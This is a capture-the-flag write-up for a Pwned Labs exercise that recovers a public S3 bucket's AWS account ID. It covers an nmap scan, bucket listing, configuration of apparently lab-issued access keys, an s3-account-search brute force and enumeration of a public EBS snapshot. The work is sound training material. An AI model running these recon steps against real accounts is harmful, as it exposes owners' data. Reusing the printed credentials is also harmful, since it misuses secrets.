# Complete CTF Write-Up: Identify AWS Account ID from Public S3 Bucket

---

## Lab Overview

**Objective**: Identify the AWS Account ID that owns a public S3 bucket and submit it as the flag.

**Tools Used**:
- Nmap
- AWS CLI
- s3-account-search tool
- curl
- Kali Linux

---

## Initial Reconnaissance

### Step 1: Initial Access

The lab provided:
- IP Address: 54.204.171.32
- Access Key ID: AKIAWHEOTHRFSKZI3H42
- Secret Access Key: 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

### Step 2: Nmap Scan

I performed an Nmap scan on the provided IP address to understand what services were running:

```bash
nmap -sV -p- 54.204.171.32
```

**Findings from Nmap Scan**:

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.54 ((Ubuntu))
```

The server was only running HTTP on port 80.

### Step 3: Web Server Investigation

Visiting http://54.204.171.32/ revealed a web page. The source code or page content contained clues about the S3 bucket.

Using curl to grab the page:

```bash
curl -s http://54.204.171.32/
```

<img width="503" height="143" alt="Screenshot 2026-06-22 004849" src="https://github.com/user-attachments/assets/1fd41fb6-d8b5-4105-a560-0078f7ab5462" />

The page contained references to an S3 bucket. Specifically, images were being loaded from:

```
https://mega-big-tech.s3.amazonaws.com/images/watchpro5.jpg
```

This revealed the S3 bucket name: **mega-big-tech**

---

## S3 Bucket Enumeration

### Step 4: Explore the S3 Bucket

Since the bucket appeared to be public, I accessed the bucket listing:

```bash
curl -s https://mega-big-tech.s3.amazonaws.com/
```

Or with AWS CLI:

```bash
aws s3 ls s3://mega-big-tech/ --no-sign-request
```

The bucket listing showed:

```xml
<ListBucketResult>
<Name>mega-big-tech</Name>
<Contents>
<Key>images/</Key>
<Contents>
<Key>images/banner.jpg</Key>
<Contents>
<Key>images/notepro1.jpg</Key>
<Contents>
<Key>images/notepro2.jpg</Key>
<!-- Multiple image files -->
<Contents>
<Key>images/watchpro5.jpg</Key>
</ListBucketResult>
```

This confirmed the bucket was publicly accessible and contained only image files.

---

## AWS Credentials Configuration

### Step 5: Configure AWS CLI

The lab provided AWS credentials:

```bash
aws configure
```

```
AWS Access Key ID [None]: AKIAWHEOTHRFSKZI3H42
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```

### Step 6: Verify Credentials

```bash
aws sts get-caller-identity
```

Output:
```json
{
    "UserId": "AIDAWHEOTHRF62U7I6AWZ",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/s3user"
}
```

This confirmed:
- Credentials were valid
- Our account ID: 427648302155
- IAM username: s3user

---

## Account ID Discovery

### Step 7: Install s3-account-search Tool

On Kali Linux, Python package installation is managed through pipx:

```bash
# Install pipx
sudo apt install -y pipx

# Install s3-account-search
pipx install s3-account-search

# Add to PATH
pipx ensurepath
source ~/.bashrc
```

### Step 8: Run Account ID Brute Force

The s3-account-search tool requires a role ARN. The lab provided:

```
arn:aws:iam::427648302155:role/LeakyBucket
```

Run the tool:

```bash
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
```

Output:

```
Starting search (this can take a while)
found: 1
found: 10
found: 107
found: 1075
found: 10751
found: 107513
found: 1075135
found: 10751350
found: 107513503
found: 1075135037
found: 10751350379
found: 107513503799
```

**Target Account ID**: 107513503799

---

## Understanding the Attack

### How s3-account-search Works

The tool exploits AWS IAM condition keys. Specifically, it uses the `s3:ResourceAccount` condition key which allows policies to check the AWS account ID of an S3 bucket.

The brute force approach:

1. The tool assumes an IAM role that has permission to perform `s3:GetObject`
2. It attempts to access the bucket with a condition like:
   ```json
   {
       "Effect": "Allow",
       "Action": "s3:GetObject",
       "Resource": "arn:aws:s3:::mega-big-tech/*",
       "Condition": {
           "StringEquals": {
               "s3:ResourceAccount": "1*"
           }
       }
   }
   ```
3. If AWS returns "AccessDenied", the prefix is incorrect
4. If AWS returns "NoSuchKey" (or similar), the prefix is correct
5. Each correct digit is appended and the process repeats
6. After 12 digits, the full account ID is discovered

### Why This Matters

AWS account IDs are 12-digit numbers, meaning there are 10^12 possible combinations. Traditional brute force would take years. This technique reduces the search space to:

- 12 positions × 10 digits = 120 attempts maximum

This makes the attack practical and quick.

---

## Discovery of Exposed Resources

### Step 9: Find the Bucket Region

```bash
curl -I https://mega-big-tech.s3.amazonaws.com
```

Response header:
```
x-amz-bucket-region: us-east-1
```

The bucket is hosted in us-east-1 (North Virginia).

### Step 10: Search for Public EBS Snapshots

Now that we have the account ID, we can search for other publicly exposed resources in the same region:

```bash
aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1
```

Output:
```json
[
    {
        "StorageTier": "standard",
        "SnapshotId": "snap-08580043db7a923f6",
        "VolumeId": "vol-04462a3562c7e6a15",
        "State": "completed",
        "StartTime": "2023-06-25T23:08:45.155000+00:00",
        "OwnerId": "107513503799",
        "Description": "Created by CreateImage(i-089b146125db92ee4) for ami-0676627ee43624fb2",
        "VolumeSize": 8,
        "Encrypted": false
    }
]
```

### Step 11: Verify the Snapshot is Public

```bash
aws ec2 describe-snapshot-attribute --snapshot-id snap-08580043db7a923f6 --attribute createVolumePermission --region us-east-1
```

Output:
```json
{
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ]
}
```

The snapshot is public and unencrypted. Anyone can create a volume from it and access the data.

### Step 12: Filter for Public Snapshots Only

```bash
aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1 --query 'Snapshots[?Public==`true`].[SnapshotId,VolumeSize,State,Description]' --output table
```

Output:
```
|  snap-08580043db7a923f6  |  8  |  completed  |  Created by CreateImage(i-089b146125db92ee4) for ami-0676627ee43624fb2  |
```

---

## What the Nmap Scan Revealed

The Nmap scan on 54.204.171.32 showed only:

- Port 80 (HTTP) - Apache web server

The web server hosted content that referenced the S3 bucket. This is how we discovered the bucket name.

### Web Server Investigation

Checking the web page source:

```bash
curl -s http://54.204.171.32/
```

Looking for S3 references:

```bash
curl -s http://54.204.171.32/ | grep -i s3
```

Looking for bucket names:

```bash
curl -s http://54.204.171.32/ | grep -i bucket
```

The output revealed the S3 bucket name: mega-big-tech

### Why Only Port 80 Matters

Even though only HTTP was open, it was enough. The web page contained references to the S3 bucket, which was the target. We didn't need SSH or HTTPS access because the web page already gave us what we needed.

---

## Summary

| Finding | Value |
|---------|-------|
| Target S3 Bucket | mega-big-tech |
| Our Account ID | 427648302155 |
| Target Account ID | 107513503799 |
| Bucket Region | us-east-1 |
| Public EBS Snapshot | snap-08580043db7a923f6 |
| Snapshot Size | 8 GB |

---

## Author Information

**Author**: Kakaxh1  
**GitHub**: https://github.com/Kakaxh1/  
**Date**: December 2025  
**Platform**: Pwned Labs - Identify AWS Account ID from a Public S3 Bucket

---

Lab Complete. Flag: 107513503799
